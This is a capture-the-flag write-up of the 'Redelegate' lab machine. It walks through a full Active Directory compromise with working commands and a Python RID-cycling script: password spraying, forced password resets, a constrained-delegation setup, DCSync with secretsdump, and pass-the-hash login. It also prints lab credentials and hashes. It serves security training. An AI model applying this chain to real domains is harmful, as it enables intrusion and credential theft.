
# Redelegate — VulnLab Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Category](https://img.shields.io/badge/Category-Active%20Directory-purple)

## Overview

Redelegate is a Windows Active Directory machine from VulnLab. The attack chain starts with anonymous FTP access exposing a KeePass database, pivots through MSSQL-based domain user enumeration, performs password spraying to gain a foothold, and culminates in a Constrained Delegation abuse leveraging `SeEnableDelegationPrivilege` to achieve full domain compromise via DCSync.

**Key Techniques:**

- Anonymous FTP enumeration
- KeePass hash cracking
- MSSQL RID cycling for domain user enumeration
- Password spraying
- BloodHound ACL analysis
- `ForceChangePassword` abuse
- Constrained Delegation (`msDS-AllowedToDelegateTo`) abuse via `SeEnableDelegationPrivilege`
- DCSync → Domain Admin

---

## Enumeration

### Port Scan

```bash
rustscan -a 10.129.4.1 -u 5000 -b 2000 -- -sCV
```

The scan reveals a classic Windows Domain Controller fingerprint:

|Port|Service|Notes|
|---|---|---|
|21|FTP|**Anonymous login allowed**|
|88|Kerberos|DC confirmed|
|389/636|LDAP/LDAPS|Domain: `redelegate.vl`|
|445|SMB||
|1433|MSSQL|SQL Server 2019 RTM — no patches|
|3389|RDP|`dc.redelegate.vl`|
|5985|WinRM|Evil-WinRM entry point|

Add the target to `/etc/hosts` and sync time immediately (Kerberos is clock-sensitive):

```bash
echo "10.129.4.1 dc.redelegate.vl redelegate.vl" | tee -a /etc/hosts
ntpdate -u 10.129.4.1
```

---

### FTP — Anonymous Access

```bash
ftp 10.129.4.1
```

<img width="633" height="650" alt="Pasted image 20260527040106" src="https://github.com/user-attachments/assets/50232138-26ae-44ce-85f3-c9caef21c4ac" />


Three files are available:

```
CyberAudit.txt
Shared.kdbx       ← KeePass database
TrainingAgenda.txt
```

> **Important:** Switch FTP to binary mode before downloading the `.kdbx` file, otherwise the database will be corrupted and cracking won't work.
> 
> ```
> ftp> binary
> ftp> get Shared.kdbx
> ```

#### CyberAudit.txt

The audit report hints at weak passwords and excessive AD privileges — useful context for the attack path ahead.

#### TrainingAgenda.txt

A training session entry stands out immediately:

```
Friday 18th October | "Weak Passwords" - Why "SeasonYear!" is not a good password
```

This is a direct hint: the KeePass master password follows the `SeasonYear!` pattern.

---

## KeePass Hash Cracking

Extract the hash and build a targeted wordlist based on the hint:

```bash
keepass2john Shared.kdbx > keepass.hash
```

**wordlist.txt:**

```
Spring2024!
Summer2024!
Fall2024!
Autumn2024!
Winter2024!
```

```bash
john --wordlist=wordlist.txt keepass.hash
```

<img width="897" height="317" alt="Pasted image 20260527040123" src="https://github.com/user-attachments/assets/d1f8547e-bc87-47a3-87bb-ab263f47fa25" />


**Result:** `Fall2024!`

> Using a custom wordlist over rockyou saves significant time here — 600,000 PBKDF2 iterations make brute force extremely slow even on modern GPUs (~4600 H/s on an RTX 3080).

#### KeePass Credentials Extracted

|Account|Password|
|---|---|
|Administrator|`Spdv41gg4BlBgSYIW1gF`|
|FTPUser|`SguPZBKdRyxWzvXRWy6U`|
|SQLGuest|`zDPBpaF4FywlqIv11vii`|
|WEB1|`cn4KOEgsHqvKXPjEnSD9`|
|Payroll|`cVkqz4bCM7kJRSNlgx2G`|
|Timesheet|`hMFS4I0Kj8Rcd62vqi5X`|
|KeyFob Combination|`22331144`|

---

## MSSQL — Domain User Enumeration via RID Cycling

Initial credential spraying reveals a valid MSSQL login:

```bash
hydra -L users.txt -P passwords.txt mssql://redelegate.vl
```

<img width="771" height="199" alt="Pasted image 20260527040143" src="https://github.com/user-attachments/assets/b63863b3-eda6-4c2e-a37b-4a9360b32a2a" />


**Valid:** `SQLGuest:zDPBpaF4FywlqIv11vii`

The `SQLGuest` account has minimal DB permissions, but MSSQL exposes a powerful built-in technique: **RID cycling via `SUSER_SNAME()`**. This allows enumeration of domain accounts without any special privileges.

### How RID Cycling Works

1. Retrieve the domain SID using a known group:

```sql
SELECT SUSER_SID('REDELEGATE\Domain Admins')
-- Returns: 0x010500000000000515000000a185deefb22433798d8e847a00020000
```

2. Strip the last 4 bytes (the RID) to get the base domain SID:

```
Domain SID: 010500000000000515000000a185deefb22433798d8e847a
```

3. For each RID to enumerate, convert to little-endian hex and append:
    
    - RID 500 (Administrator) → hex `01F4` → little-endian `F401` → padded to 8 bytes: `F4010000`
    - Full SID: `0x010500000000000515000000a185deefb22433798d8e847aF4010000`
4. Query the account name:
    

```sql
SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847aF4010000)
-- Returns: WIN-Q13O908QBPG\Administrator
```

### Automated RID Cycling Script

```python
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

domain_sid = "0x010500000000000515000000a185deefb22433798d8e847a"
target = "dc.redelegate.vl"
user = "SQLGuest"
password = "zDPBpaF4FywlqIv11vii"
domain = "redelegate.vl"
mssqlclient = "/bloodyAD/.venv/bin/mssqlclient.py"

found_users = []

def check_rid(rid):
    rid_hex = rid.to_bytes(4, byteorder='little').hex()
    full_sid = domain_sid + rid_hex
    query = f"SELECT SUSER_SNAME({full_sid})"

    result = subprocess.run([
        "python3", mssqlclient,
        f"{domain}/{user}:{password}@{target}",
        "-command", query
    ], capture_output=True, text=True)

    output = result.stdout + result.stderr
    for line in output.splitlines():
        line = line.strip()
        if "\\" in line and "[" not in line and "INFO" not in line and "ACK" not in line:
            username = line.split("\\")[-1].strip()
            if username:
                return (rid, username)
    return None

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(check_rid, rid): rid for rid in range(1000, 2000)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            rid, username = result
            print(f"[+] RID {rid}: {username}")
            found_users.append(username)

with open("domain_users.txt", "w") as f:
    for u in sorted(found_users):
        f.write(u + "\n")
```

<img width="588" height="271" alt="Pasted image 20260527040213" src="https://github.com/user-attachments/assets/95a08568-c517-447d-b2ac-079befff6458" />


#### Discovered Domain Accounts

```
Helen.Frost
Michael.Pontiac
Mallory.Roberts
Christine.Flanders
Marie.Curie
James.Dinkleberg
Ryan.Cooper
sql_svc
DC$
FS01$
```

---

## Password Spraying → Foothold

Combine the KeePass passwords with the season-based wordlist and spray across discovered users:

```bash
netexec smb dc.redelegate.vl -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

<img width="779" height="60" alt="Pasted image 20260527040230" src="https://github.com/user-attachments/assets/222362cb-7621-44e6-b8bf-a23e4a642753" />


**Valid credential:** `Marie.Curie:Fall2024!`

---

## BloodHound — ACL Analysis

```bash
bloodhound-python -c ALL -u Marie.Curie -p 'Fall2024!' -d redelegate.vl -ns 10.129.4.1 --zip
```

BloodHound reveals a clear attack path:

```
Marie.Curie
  └─ MemberOf ──────────► HELPDESK
                              └─ ForceChangePassword ──► Helen.Frost
                                                            └─ MemberOf ──► IT
                                                                              └─ GenericAll ──► FS01$
```

<img width="937" height="420" alt="Pasted image 20260527040254" src="https://github.com/user-attachments/assets/39e59ec6-3329-49b7-897a-5ce9f5c7ca03" />



---

## Privilege Escalation

### Step 1 — ForceChangePassword on Helen.Frost

`Marie.Curie` is a member of `HELPDESK`, which has `ForceChangePassword` rights over `Helen.Frost`. No knowledge of the current password is required.

```bash
bloodyAD --host dc.redelegate.vl -d redelegate.vl -u Marie.Curie -p 'Fall2024!' set password helen.frost 'test1234!'
```

### Step 2 — Reset FS01$ Machine Account Password

`Helen.Frost` is a member of `IT`, which has `GenericAll` on `FS01$`. This allows resetting the machine account password:

```bash
bloodyAD -u 'Helen.Frost' -p 'test1234!' -d 'redelegate.vl' --dc-ip 10.129.4.1 set password 'FS01$' 'FakePass123!'
```

### Step 3 — User Flag & Privilege Discovery

```bash
evil-winrm -i dc.redelegate.vl -u Helen.Frost -p 'test1234!'
```

```powershell
whoami /priv
```

Two critical privileges stand out:

<img width="817" height="38" alt="Pasted image 20260527040322" src="https://github.com/user-attachments/assets/d4000ef8-2dd3-430a-97db-1669587418ce" />


|Privilege|Description|
|---|---|
|`SeMachineAccountPrivilege`|Add workstations to domain|
|`SeEnableDelegationPrivilege`|**Enable accounts to be trusted for delegation**|

`SeEnableDelegationPrivilege` is highly sensitive — it allows configuring Kerberos delegation settings on AD objects, which is the key to domain compromise.

---

## Domain Compromise — Constrained Delegation Abuse

### Why This Works

`Helen.Frost` has:

- `GenericAll` on `FS01$` → can modify any attribute on the computer object
- `SeEnableDelegationPrivilege` → can set delegation flags on AD objects

The attack configures **Constrained Delegation** on `FS01$` targeting `ldap/dc.redelegate.vl`. With S4U2Self + S4U2Proxy, `FS01$` can then impersonate any domain user (including `dc$`) against the DC's LDAP service — which is all that's needed for DCSync.

> This is the reason the machine is called **"Redelegate"** — the core technique is (re)configuring delegation.

### Step 4 — Configure Constrained Delegation

From the `Helen.Frost` WinRM session:

```powershell
# Allow FS01$ to perform S4U2Self (impersonate any user to itself)
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True

# Set constrained delegation target: ldap on the DC
Set-ADObject -Identity "CN=FS01,CN=Computers,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo" = "ldap/dc.redelegate.vl"}
```

### Step 5 — Obtain a Service Ticket Impersonating DC

```bash
# Sync time first to avoid KRB_AP_ERR_SKEW
ntpdate -u 10.129.4.1

getST.py 'redelegate.vl/FS01$:FakePass123!' -spn ldap/dc.redelegate.vl -impersonate dc -dc-ip 10.129.4.1
```

This uses S4U2Self + S4U2Proxy to obtain a forwardable service ticket for `ldap/dc.redelegate.vl` as the `dc$` machine account.

### Step 6 — DCSync

```bash
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache

secretsdump.py -k -no-pass dc.redelegate.vl
```

All domain hashes are dumped:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
[... all users ...]
```

<img width="991" height="780" alt="Pasted image 20260527040341" src="https://github.com/user-attachments/assets/be8336f8-d57e-4df2-b6c2-50d61d6e569f" />


### Step 7 — Domain Admin Shell

```bash
evil-winrm -i dc.redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
```

**Domain compromised.**

---
Writeup by ctxzero — HackTheBox: Redelegate.vl
